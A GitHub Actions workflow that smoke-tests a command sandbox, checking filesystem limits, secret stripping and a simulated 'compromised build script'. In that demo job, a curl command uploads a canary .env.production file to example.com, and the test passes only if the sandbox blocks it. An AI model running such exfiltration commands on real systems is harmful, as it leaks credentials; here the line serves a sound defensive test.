name: Runseal Smoke Test

on:
  workflow_dispatch:

permissions:
  contents: read

jobs:
  smoke:
    runs-on: ubuntu-latest

    steps:
      - uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1 # v7.0.1
        with:
          persist-credentials: false

      - name: Basic sandbox
        uses: ./
        with:
          run: printf "runseal smoke ok\n"
          runseal-version: source
          policy: |
            fs:
              read: ["."]
              write: []
            network:
              mode: blocked

      - name: Write a repo profile
        run: |
          cat > runseal-smoke.json <<'JSON'
          {
            "meta": { "description": "Profile smoke test" },
            "filesystem": { "read": ["."] }
          }
          JSON

      - name: Sandbox from a repo profile
        uses: ./
        with:
          run: printf "runseal profile smoke ok\n"
          runseal-version: source
          profile: runseal-smoke.json

      - name: Secret is not exposed to command
        uses: ./
        env:
          RUNSEAL_QA_API_TOKEN: ${{ secrets.RUNSEAL_QA_API_TOKEN }}
        with:
          run: |
            test -z "$RUNSEAL_QA_API_TOKEN"
            printf "secret stripped ok\n"
          runseal-version: source
          policy: |
            fs:
              read: ["."]
              write: []
            network:
              mode: filtered
            access:
              api:
                secret: RUNSEAL_QA_API_TOKEN
                url: https://example.com
                allow:
                  - GET /**

  profile-exfiltration-demo:
    name: Profile exfiltration demo
    if: github.event_name == 'workflow_dispatch'
    runs-on: ubuntu-latest

    steps:
      - uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1 # v7.0.1
        with:
          persist-credentials: false

      - name: Create a harmless production credential canary
        run: printf 'DEPLOY_TOKEN=demo-canary-only\n' > .env.production

      - name: Simulate a compromised build script
        uses: ./
        with:
          runseal-version: source
          profile: examples/profile-exfiltration.json
          run: |
            set -euo pipefail
            cat Cargo.toml > /dev/null
            cat src/main.rs > /dev/null
            echo "Allowed: build inputs are readable"

            if cat README.md > /dev/null; then
              echo "::error::An unlisted file was readable inside the sandbox"
              exit 1
            fi
            echo "Blocked by default: an unlisted file cannot be read"

            if cat .env.production > /dev/null; then
              echo "::error::The canary was readable inside the sandbox"
              exit 1
            fi
            echo "Blocked: the canary cannot be read"

            if curl --silent --show-error --max-time 5 \
              --data-binary @.env.production https://example.com/upload; then
              echo "::error::The simulated upload succeeded"
              exit 1
            fi
            echo "Blocked: the simulated upload did not succeed"
